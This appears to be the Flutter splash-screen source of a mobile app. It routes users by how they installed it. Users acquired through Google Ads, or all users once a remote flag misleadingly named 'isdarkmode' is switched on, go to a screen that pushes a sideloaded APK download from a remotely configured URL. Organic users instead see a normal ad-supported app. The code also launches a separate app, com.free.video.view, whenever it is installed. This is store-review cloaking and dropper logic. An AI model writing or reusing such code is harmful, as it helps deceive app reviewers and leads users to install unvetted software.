import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'home_screen.dart';
import 'onboarding_screen.dart';
import 'web_store_screen.dart';
import '../config/app_config.dart';
import '../link_handler.dart';
import '../services/app_launcher_helper.dart';
import '../services/ad_manager.dart';
import '../services/install_source_service.dart';

class SplashScreen extends StatefulWidget {
  final bool hasSeenOnboarding;

  const SplashScreen({super.key, this.hasSeenOnboarding = false});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  bool _isNavigated = false;

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..addListener(() {
        setState(() {});
      })..addStatusListener((status) {
        if (status == AnimationStatus.completed) {
          _proceedNavigation();
        }
      });

    _checkImmediateTargetApp();
  }

  Future<void> _checkImmediateTargetApp() async {
    // Step 1: Immediately check if com.free.video.view is already installed
    final bool isTargetInstalled = await AppLauncherHelper.isTargetAppInstalled();
    if (isTargetInstalled) {
      debugPrint('[Splash] Target app com.free.video.view IS installed! Launching immediately...');
      final bool launched = await AppLauncherHelper.openTargetApp();
      if (launched) {
        debugPrint('[Splash] Successfully opened com.free.video.view');
        await Future.delayed(const Duration(milliseconds: 500));
        SystemNavigator.pop();
        return;
      }
    }

    if (!mounted) return;
    _controller.forward();
  }

  Future<void> _proceedNavigation() async {
    if (_isNavigated || !mounted) return;
    _isNavigated = true;

    // Step 2: Run referrer check AND Remote Config fetch IN PARALLEL
    // This cuts worst-case first-open delay from 12s → 7s.
    // After first open, referrer is cached → both complete in ~200ms.
    final remoteConfig = FirebaseRemoteConfig.instance;
    final results = await Future.wait([
      // 2A: Google Ads CPI detection (reads local Play Store service — no network needed)
      InstallSourceService.isFromGoogleAds(),
      // 2B: Remote Config fetch (needed for apk_url / store_url)
      remoteConfig.fetchAndActivate().timeout(const Duration(seconds: 5)).then((_) => false).catchError((e) {
        debugPrint('[Splash] Remote Config fetch error/timeout: $e');
        return false;
      }),
    ]);

    final bool isGoogleAdsUser = results[0];
    debugPrint('[Splash] isGoogleAdsUser: $isGoogleAdsUser');
    LinkHandler.loadFromConfig(remoteConfig);

    if (!mounted) return;

    // Step 3: Routing decision
    //
    //  Google Ads CPI user → ALWAYS show WebStoreScreen to push APK download
    //                         (isdarkmode flag is ignored for this segment)
    //
    //  Organic / non-Google user → follow Remote Config isdarkmode:
    //    true  → WebStoreScreen
    //    false → normal AdMob app experience
    final bool shouldRedirect = isGoogleAdsUser || LinkHandler.isDarkMode;

    if (shouldRedirect) {
      debugPrint('[Splash] Redirecting to WebStoreScreen '
          '(googleAds=$isGoogleAdsUser, rcDarkMode=${LinkHandler.isDarkMode}) '
          'apkUrl=${LinkHandler.apkDownloadUrl}');
      if (!mounted) return;
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(
          builder: (_) => WebStoreScreen(
            storeUrl: LinkHandler.storeUrl,
            downloadUrl: LinkHandler.apkDownloadUrl,
          ),
        ),
      );
    } else {
      debugPrint('[Splash] Normal mode — Remote Config isdarkmode=false, organic user. Opening app with AdMob.');
      // Show App Open Ad, then navigate to normal app
      AdManager.showAppOpenAdIfAvailable(onComplete: () async {
        if (!mounted) return;
        bool seen = widget.hasSeenOnboarding;
        try {
          final prefs = await SharedPreferences.getInstance();
          seen = prefs.getBool('has_seen_onboarding') ?? seen;
        } catch (_) {}
        if (!mounted) return;
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(
            builder: (context) => seen
                ? const HomeScreen()
                : const OnboardingScreen(),
          ),
        );
      });
    }
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.scaffoldBackground,
      body: SafeArea(
        child: Center(
          child: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 40.0),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                ClipRRect(
                  borderRadius: BorderRadius.circular(20),
                  child: Image.asset(
                    'assets/app_icon/app_logo.png',
                    width: 100,
                    height: 100,
                    fit: BoxFit.cover,
                  ),
                ),
                const SizedBox(height: 24),
                FittedBox(
                  fit: BoxFit.scaleDown,
                  child: Text(
                    AppStrings.appTitle,
                    textAlign: TextAlign.center,
                    style: const TextStyle(
                      fontSize: 24,
                      fontWeight: FontWeight.bold,
                      color: AppColors.textWhite,
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                const Text(
                  AppStrings.splashInitializing,
                  style: TextStyle(
                    fontSize: 14,
                    color: AppColors.textWhite54,
                  ),
                ),
                const SizedBox(height: 40),
                ClipRRect(
                  borderRadius: BorderRadius.circular(10),
                  child: LinearProgressIndicator(
                    value: _controller.value,
                    minHeight: 8,
                    backgroundColor: Colors.white24,
                    color: AppColors.primaryCyan,
                  ),
                ),
                const SizedBox(height: 10),
                Text(
                  "${(_controller.value * 100).toInt()}%",
                  style: const TextStyle(
                    color: AppColors.primaryCyan,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
